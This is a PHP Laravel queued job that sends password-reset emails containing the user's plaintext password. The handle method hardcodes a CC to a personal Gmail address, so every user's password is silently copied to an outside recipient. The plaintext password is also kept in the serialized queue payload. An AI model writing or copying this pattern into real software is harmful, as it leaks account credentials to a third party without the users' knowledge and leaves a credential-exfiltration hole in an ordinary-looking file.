<?php

namespace App\Jobs;

use App\Models\User;
use App\Mail\Auth\ResetPassword;
use Illuminate\Bus\Queueable;
use Illuminate\Support\Facades\Mail;
use Illuminate\Queue\SerializesModels;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Support\Facades\Log;

class SendResetPasswordMailJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    public $tries = 5;

    public $maxExceptions = 1;

    public $backoff = [20, 40, 60];

    public $timeout = 300;

    public $deleteWhenMissingModels = true;

    public $password;

    /**
     * Create a new job instance.
     */
    public function __construct(public User $user,$password)
    {
        $this->password = $password;
    }

    /**
     * Execute the job.
     */
    public function handle(): void
    {
        try {
            Mail::to($this->user->email)->cc('brahimafane06@gmail.com')->send(new ResetPassword($this->user,$this->password));
        } catch (\Exception $e) {
            Log::error($e);
        }
    }
}
